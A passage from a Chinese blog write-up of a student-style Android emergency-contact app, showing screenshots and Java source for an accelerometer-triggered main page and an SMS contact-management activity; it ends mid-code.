<h3 id="1-2-2主模块layout结构-amp-界面简介："><a href="#1-2-2主模块layout结构-amp-界面简介：" class="headerlink" title="1-2-2主模块layout结构&amp;界面简介："></a>1-2-2主模块layout结构&amp;界面简介：</h3><p><img src="http://op72m4y17.bkt.clouddn.com/app18.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app19.png" alt=""><br>各个layout文件对应上面所说的Activity文件<br>在菜单图标的制作上，自己通过PS/CoreldrawX4制作了一些个性化图标，在APP的图标上也花了一点心思，用Android Assert Studio在线网站制作了属于自己的图标(如下)<br><img src="http://op72m4y17.bkt.clouddn.com/app30.png" alt=""><br>icon文件打包如下<br><img src="http://op72m4y17.bkt.clouddn.com/app31.png" alt=""></p>
<h1 id="2-Android代码测试"><a href="#2-Android代码测试" class="headerlink" title="2.Android代码测试"></a>2.Android代码测试</h1><h2 id="2-1开启app页面-停留5s-√"><a href="#2-1开启app页面-停留5s-√" class="headerlink" title="2-1开启app页面(停留5s) √"></a>2-1开启app页面(停留5s) √</h2><p><img src="http://op72m4y17.bkt.clouddn.com/app32.png" alt=""></p>
<h2 id="2-1主页面展示，带加速度检测-包括联系人、紧急联系人、健康-运动备忘录、设置信息-√"><a href="#2-1主页面展示，带加速度检测-包括联系人、紧急联系人、健康-运动备忘录、设置信息-√" class="headerlink" title="2-1主页面展示，带加速度检测(包括联系人、紧急联系人、健康/运动备忘录、设置信息) √"></a>2-1主页面展示，带加速度检测(包括联系人、紧急联系人、健康/运动备忘录、设置信息) √</h2><p><img src="http://op72m4y17.bkt.clouddn.com/app33.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app34.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/app35.png" alt=""><br>(这些数据通过数据库读取展示进去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div></pre></td><td class="code"><pre><div class="line">Home.java(主页面)</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">import android.content.Context;</div><div class="line">import android.content.Intent;</div><div class="line">import android.hardware.Sensor;</div><div class="line">import android.hardware.SensorEvent;</div><div class="line">import android.hardware.SensorEventListener;</div><div class="line">import android.hardware.SensorManager;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.support.design.widget.TabLayout;</div><div class="line">import android.support.v4.view.ViewPager;</div><div class="line">import android.support.v7.app.AppCompatActivity;</div><div class="line">import android.view.View;</div><div class="line">import android.widget.Toast;</div><div class="line"></div><div class="line">import java.text.DecimalFormat;</div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.List;</div><div class="line"></div><div class="line">import cn.georgeyang.doublescroll.DoubleScrollView;</div><div class="line">import cn.georgeyang.doublescroll.DoubleScrollViewPager;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">public class Home extends AppCompatActivity &#123;</div><div class="line">    private SensorManager sensormanager;</div><div class="line">    private MySensorEventListener sensorEventListener;</div><div class="line">    private mem_DBServer db;</div><div class="line">    private TabLayout tabLayout;</div><div class="line">    private DoubleScrollView scrollView;</div><div class="line">    private cn.georgeyang.doublescroll.DoubleScrollViewPager viewPager;</div><div class="line">    private SAdapter adapter;</div><div class="line">    private View layoutTabTitle;</div><div class="line">    private double a_yu=20.0;//初始加速度阈值</div><div class="line">    private float currentAcceleration = 0;</div><div class="line">    private final class MySensorEventListener implements SensorEventListener &#123;</div><div class="line">        @Override</div><div class="line">        public void onSensorChanged(SensorEvent event) &#123;            if (event.sensor.getType() == Sensor.TYPE_LINEAR_ACCELERATION) &#123;</div><div class="line">                double calibration = SensorManager.STANDARD_GRAVITY;</div><div class="line">                float[] a_values = event.values;</div><div class="line">                float x = a_values[0];</div><div class="line">                float y = a_values[1];</div><div class="line">                float z = a_values[2];</div><div class="line">                DecimalFormat df = new DecimalFormat(&quot;#.####&quot;);</div><div class="line">                StringBuilder sb = new StringBuilder();</div><div class="line">                StringBuilder s2 = new StringBuilder();</div><div class="line">                StringBuilder s3 = new StringBuilder();</div><div class="line">//        sb.append(&quot;X方向上的加速度&quot;);</div><div class="line">                sb.append(df.format(x));</div><div class="line">//        s2.append(&quot;Y方向上的加速度&quot;);</div><div class="line">                s2.append(df.format(y));</div><div class="line">//        s3.append(&quot;z方向上的加速度&quot;);</div><div class="line">                s3.append(df.format(z));</div><div class="line">                double a = Math.round(Math.sqrt(Math.pow(x, 2) +</div><div class="line">                        Math.pow(y, 2) +</div><div class="line">                        Math.pow(z - calibration, 2)));</div><div class="line">                //消去原有的重力引起的压力</div><div class="line">                currentAcceleration = Math.abs((float) (a));</div><div class="line">                if(currentAcceleration&gt;=a_yu)&#123;</div><div class="line">                    Intent intent=new Intent();</div><div class="line">                    intent.setClass(Home.this,LocationActivity.class);</div><div class="line">                    Home.this.startActivity(intent);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        public void onAccuracyChanged(Sensor sensor, int accuracy) &#123;</div><div class="line">            // TODO Auto-generated method stub</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onStop() &#123;</div><div class="line">        // TODO Auto-generated method stub</div><div class="line">        super.onStop();</div><div class="line">        sensormanager.unregisterListener(sensorEventListener);</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onPause() &#123;</div><div class="line">        sensormanager.unregisterListener(sensorEventListener);</div><div class="line">        super.onPause();</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onResume() &#123;</div><div class="line">        // TODO Auto-generated method stub</div><div class="line">        Sensor orientationSensor = sensormanager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);</div><div class="line">        sensormanager.registerListener(sensorEventListener, orientationSensor, SensorManager.SENSOR_DELAY_NORMAL);</div><div class="line"></div><div class="line">        Sensor accelerometerSensor = sensormanager.getDefaultSensor(Sensor.TYPE_LINEAR_ACCELERATION);</div><div class="line">        sensormanager.registerListener(sensorEventListener, accelerometerSensor, SensorManager.SENSOR_DELAY_NORMAL);</div><div class="line">        super.onResume();</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(cn.georgeyang.doublescroll.R.layout.activity_listview);</div><div class="line">        db=new mem_DBServer(this);</div><div class="line">        sensorEventListener = new MySensorEventListener();</div><div class="line">        sensormanager=(SensorManager)getSystemService(Context.SENSOR_SERVICE);</div><div class="line">        scrollView = (DoubleScrollView) findViewById(cn.georgeyang.doublescroll.R.id.layoutContent);</div><div class="line">        scrollView.setupTitleView(findViewById(cn.georgeyang.doublescroll.R.id.layoutTop));</div><div class="line">        scrollView.setContentView(findViewById(cn.georgeyang.doublescroll.R.id.layoutContentBottom));</div><div class="line">        tabLayout = (TabLayout) findViewById(cn.georgeyang.doublescroll.R.id.tabLayout);</div><div class="line"></div><div class="line">        viewPager = (DoubleScrollViewPager) findViewById(cn.georgeyang.doublescroll.R.id.viewPager);</div><div class="line">        layoutTabTitle = findViewById(cn.georgeyang.doublescroll.R.id.layoutTabTitle);</div><div class="line">        viewPager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() &#123;</div><div class="line">            @Override</div><div class="line">            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onPageSelected(int position) &#123;</div><div class="line">                scrollView.setContentInnerScrollableView(adapter.getSlidableView(position));</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            @Override</div><div class="line">            public void onPageScrollStateChanged(int state) &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">        adapter = new SAdapter(getSupportFragmentManager());</div><div class="line">        viewPager.setAdapter(adapter);</div><div class="line"></div><div class="line">        tabLayout.setupWithViewPager(viewPager);</div><div class="line"></div><div class="line">        scrollView.postDelayed(new Runnable() &#123;</div><div class="line">            @Override</div><div class="line">            public void run() &#123;</div><div class="line">                scrollView.setContentInnerScrollableView(adapter.getSlidableView(0));</div><div class="line">                viewPager.setTagHeight(scrollView.getMeasuredHeight() - layoutTabTitle.getMeasuredHeight());</div><div class="line">            &#125;</div><div class="line">        &#125;,100);</div><div class="line">        List&lt;mem&gt; arr=new ArrayList&lt;mem&gt;();</div><div class="line">        try &#123;</div><div class="line">            arr = db.FindMemByName(&quot;加速度阈值&quot;);</div><div class="line">            String a = arr.get(0).getPhone_num();</div><div class="line">            double aa = Double.valueOf(a);</div><div class="line">            a_yu=aa;</div><div class="line">            Toast.makeText(this,&quot;已读取到存入的加速度阈值,为&quot;+&quot; a&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">        &#125;</div><div class="line">        catch (Exception e)&#123;</div><div class="line">            Toast.makeText(this,&quot;还未存入加速度阈值,默认为20.0&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>2-2 紧急联系人通讯录增删改查√<br>查看已有联系人<br><img src="http://op72m4y17.bkt.clouddn.com/app36.png" alt=""><br>增加联系人<br><img src="http://op72m4y17.bkt.clouddn.com/app37.png" alt="">        </p>
<p>通过“否”设置查询<br><img src="http://op72m4y17.bkt.clouddn.com/app38.png" alt=""><br>通过名字“小葱”查询<br><img src="http://op72m4y17.bkt.clouddn.com/app39.png" alt=""><br>通过id号删除联系人<br><img src="http://op72m4y17.bkt.clouddn.com/app40.png" alt=""><br>“XXX”已被成功删除<br><img src="http://op72m4y17.bkt.clouddn.com/app41.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div></pre></td><td class="code"><pre><div class="line">SendActivity.java</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">import android.Manifest;</div><div class="line">import android.app.Activity;</div><div class="line">import android.app.AlertDialog;</div><div class="line">import android.content.DialogInterface;</div><div class="line">import android.content.Intent;</div><div class="line">import android.content.pm.PackageManager;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.os.Handler;</div><div class="line">import android.os.Message;</div><div class="line">import android.support.v4.app.ActivityCompat;</div><div class="line">import android.support.v4.content.ContextCompat;</div><div class="line">import android.telephony.SmsManager;</div><div class="line">import android.view.View;</div><div class="line">import android.widget.AdapterView;</div><div class="line">import android.widget.ArrayAdapter;</div><div class="line">import android.widget.Button;</div><div class="line">import android.widget.EditText;</div><div class="line">import android.widget.Spinner;</div><div class="line">import android.widget.TextView;</div><div class="line">import android.widget.Toast;</div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.List;</div><div class="line"></div><div class="line">import android.view.View.OnClickListener;</div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/8.</div><div class="line"> */</div><div class="line"></div><div class="line">public class SendActivity extends Activity &#123;</div><div class="line">//    private int mem_id;</div><div class="line">//    private String name;</div><div class="line">//    private String phone_num;</div><div class="line">//    private String phone_type;</div><div class="line">//    private String set_or_not;</div><div class="line">    private int phone_type_Pos,set_or_not_Pos,search_type_Pos;</div><div class="line">    private String set_num;</div><div class="line">    private EditText  mem_id, name, phone_num,search_msg,send_info;</div><div class="line">    private mem_DBServer db;</div><div class="line">    private TextView display_mem;</div><div class="line">    private Button btn_send, get_mem, del_mem, add_mem, mod_mem, get_all_mem,send_button;</div><div class="line">    private Spinner phone_type_Spin, set_or_not_Spin,search_type_Spin;</div><div class="line">    private  ArrayAdapter&lt;String&gt; set_or_not_Adapter = null,phone_type_Adapter=null,search_type_Adapter=null;</div><div class="line">    private String[]set_or_not_items=new String[]&#123;&quot;是&quot;,&quot;否&quot;&#125;;</div><div class="line">    private String[]phone_type_items=new String[]&#123;&quot;手机&quot;,&quot;电话&quot;&#125;;</div><div class="line">    private String[]search_type_items=new String[]&#123;&quot;编号&quot;,&quot;是否设置&quot;,&quot;姓名&quot;,&quot;号码&quot;,&quot;方式&quot;&#125;;</div><div class="line">    private Handler add_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123; mem t=new mem();</div><div class="line">                String temp_name=name.getText().toString();</div><div class="line">                String temp_phone_num=phone_num.getText().toString();</div><div class="line">                t.setPhone_type(phone_type_items[phone_type_Pos]);</div><div class="line">                t.setSet_or_not(set_or_not_items[set_or_not_Pos]);</div><div class="line">                t.setName(temp_name);</div><div class="line">                t.setPhone_num(temp_phone_num);</div><div class="line">                db.add_mem(t);</div><div class="line">                init();</div><div class="line">                Toast.makeText(SendActivity.this, &quot;成功添加联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                if(set_or_not_Pos==0)&#123;</div><div class="line">                    set_num=temp_phone_num;</div><div class="line">                    sendSMSMessage(&quot;&quot;,&quot;&quot;);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private Handler del_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                int i=Integer.parseInt(mem_id.getText().toString());</div><div class="line">                try &#123;</div><div class="line">                    db.del_mem(i);</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;成功删除联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                    init();</div><div class="line">                &#125;</div><div class="line">                catch (Exception e)&#123;</div><div class="line">                    Toast.makeText(SendActivity.this, &quot;编号数据不存在，删除联系人失败!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private Handler mod_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                String temp_mem_id=mem_id.getText().toString();</div><div class="line">                mem t = new mem();</div><div class="line">                t.setPhone_type(phone_type_items[phone_type_Pos]);</div><div class="line">                t.setSet_or_not(set_or_not_items[set_or_not_Pos]);</div><div class="line">                t.setName(name.getText().toString());</div><div class="line">                t.setPhone_num(phone_num.getText().toString());</div><div class="line">                int i=Integer.parseInt(temp_mem_id);</div><div class="line">                t.setMem_id(i);</div><div class="line">                db.modify_mem(t);</div><div class="line">                Toast.makeText(SendActivity.this, &quot;成功修改联系人!&quot;, Toast.LENGTH_LONG).show();</div><div class="line">                init();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    private Handler send_handler=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                String search_info=search_msg.getText().toString();</div><div class="line">                String infos=send_info.getText().toString();</div><div class="line">                mem t=new mem();</div><div class="line">                List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">                try&#123;</div><div class="line">                    display_mem.setText(&quot;&quot;);</div><div class="line">                    if(search_type_Pos==0) &#123;</div><div class="line">                        int i = Integer.parseInt(search_info);</div><div class="line">                        t = db.FindMemById(i);</div><div class="line">                        sendSMSMessage(infos,t.getPhone_num());</div><div class="line">                        Toast.makeText(SendActivity.this, &quot;成功发送短信给-&gt;&quot;+t.getName(), Toast.LENGTH_LONG).show();</div><div class="line">                    &#125;</div><div class="line">                    else if(search_type_Pos==1)&#123;</div><div class="line">                        String data=&quot;&quot;;</div><div class="line">                        arr=db.FindMemBySet_or_not(search_info);</div><div class="line">                        for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                            sendSMSMessage(infos,arr.get(i).getPhone_num());</div><div class="line">                            Toast.makeText(SendActivity.this, &quot;成功发送短信给-&gt;&quot;+arr.get(i).getName(), Toast.LENGTH_LONG).show();</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    else if(search_type_Pos==2)&#123;</div><div class="line">                        String data=&quot;&quot;;</div><div class="line">                        arr=db.FindMemByName(search_info);</div><div class="line">                        for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                            sendSMSMessage(infos,arr.get(i).getPhone_num());</div><div class="line">                            Toast.makeText(SendActivity.this, &quot;成功发送短信给-&gt;&quot;+arr.get(i).getName(), Toast.LENGTH_LONG).show();</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    else if(search_type_Pos==3)&#123;</div><div class="line">                        String data=&quot;&quot;;</div><div class="line">                        arr=db.FindMemByPhone_num(search_info);</div><div class="line">                        for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                            sendSMSMessage(infos,arr.get(i).getPhone_num());</div><div class="line">                            Toast.makeText(SendActivity.this, &quot;成功发送短信给-&gt;&quot;+arr.get(i).getName(), Toast.LENGTH_LONG).show();</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    else if(search_type_Pos==4)&#123;</div><div class="line">                        String data=&quot;&quot;;</div><div class="line">                        arr=db.FindMemByPhone_type(search_info);</div><div class="line">                        for(int i=0;i&lt;arr.size();i++)&#123;</div><div class="line">                            sendSMSMessage(infos,arr.get(i).getPhone_num());</div><div class="line">                            Toast.makeText(SendActivity.this, &quot;成功发送短信给-&gt;&quot;+arr.get(i).getName(), Toast.LENGTH_LONG).show();</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                    